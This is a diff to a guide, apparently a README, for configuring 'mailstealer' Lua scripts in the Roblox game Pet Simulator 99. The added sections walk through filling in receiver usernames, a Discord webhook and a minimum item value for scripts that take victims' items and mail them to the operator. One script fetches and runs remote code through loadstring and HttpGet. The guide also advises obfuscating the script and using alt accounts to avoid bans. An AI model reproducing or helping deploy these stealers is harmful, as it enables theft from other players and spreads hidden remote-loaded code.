@@ -35,7 +35,9 @@ Click copy webhook url and ur done
 # 2: setting up the lua code
 # TIP FOR ANDRIOD USERS
 - get [X-Plore File manager](https://play.google.com/store/apps/details?id=com.lonelycatgames.Xplore&hl=en&gl=US&pli=1)
-
+<details>  
+  <summary>Aurora Mailstealer</summary>  
+  
 Get the script from ⁠[script channel from discord](https://discord.com/channels/1226830019939143690/1227851051634266193)
 It should look like this:
 ```lua
@@ -65,6 +67,7 @@ Now if this value(Username2) is kept empty/removed then it'll be set to my ign(o
 ~~If I'm nice I might return the items~~  
 Now the webhook, You should've gotten the webhook from step 1 So put it to the `Webhook` value  
 For example `Webhook = "discord.com/x/x`  
+
   
 Now minimum rap, Minimum rap means the item has to be the same or above the rap you put into the script   
   
@@ -82,6 +85,55 @@ Or remove everything related to it (keySystemEnabled, hubName, keyLink, keys !!!
 I think you can figure rest of the stuff out  
 now after doing everything you save your script to a file call it mailsetaler.txt and save it somewhere(using notepad or a file editor) then go to step 3(part2)  
 Make sure to [DM](https://discord.gg/Eh7EX6dzAF) me if you cant follow something  I'll help you   
+  
+use https://enivzoy.github.io/Aurora/ to generate your script for better user interface
+  
+</details>  
+<details>  
+  <summary>Tobi Mailstealer</summary>  
+   
+[Aurora](https://discord.gg/Eh7EX6dzAF) is 99.99% better
+use aurora instead, but since im nice ill do tobis too  
+get the script from tobis script channel the currrent one at 5/28/24 is V6.1  
+i wont be sharing his discord server upto you to find it or use aurora instead    
+it should look something like this  
+  
+```lua
+Username = "your user here"
+Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "your webhook here"
+Support = true -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
+min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+loadstring(game:HttpGet("USE AURORA INSTEAD"))()
+```
+  
+don't copy the script from here incase a major rewrite/bugs go join tobis server for a updated one
+Make sure you have a ps99 account which can receive mail, Aka must have reached area 10. It's better to use a alt account (or 2 alt accounts incase you get banned)  
+So the `Username` should be your username for like the account to receive the mail  
+For example `Username = "GetAuroraMS"`  
+Now here's the tricky part  
+If you have an alt  
+You need to fill in the `Username2` also  
+If you happen to have your mains mailbox full it will send to username2  
+Now if this value(Username2) is kept empty/removed then it'll be set to my ign(only if the value is empty or removed completely) to avoid errors(no this isn't dualhooking, it's a failsafe)  
+~~If I'm nice I might return the items~~  
+Now the webhook, You should've gotten the webhook from step 1 So put it to the `Webhook` value  
+For example `Webhook = "discord.com/x/x`  
+
+Now support, Ssupport means that if you get 10+ huges or 500+ mil rap then it flips a coin(math.random) and if its (>0.5) then it will send the hit to tobi, for your sake its upto you to set this to false  
+  
+Now minimum rap, Minimum rap means the item has to be the same or above the rap you put into the script   
+  
+Now let's say you have min rap to about 1m, And you hit a guy with 500k
+You won't get anything because the min rap is 1m  
+Now minrap is calculated based on whole numbers(no "m" or "k" if it's 6k then it should be 6000 if it's 1m then it should be 1000000)  
+So if your into the high stuff  
+Set your min rap to 1-3m  
+  
+this is it for tobis but aurora is wayy better so join [Aurora](https://discord.gg/Eh7EX6dzAF)
+continue following step 3 : obfuscation & uploading
+  
+</details>   
   
 # 3: obfuscation & uploading
 Now you gotta obfuscate your bot so people don't spam your webhook  
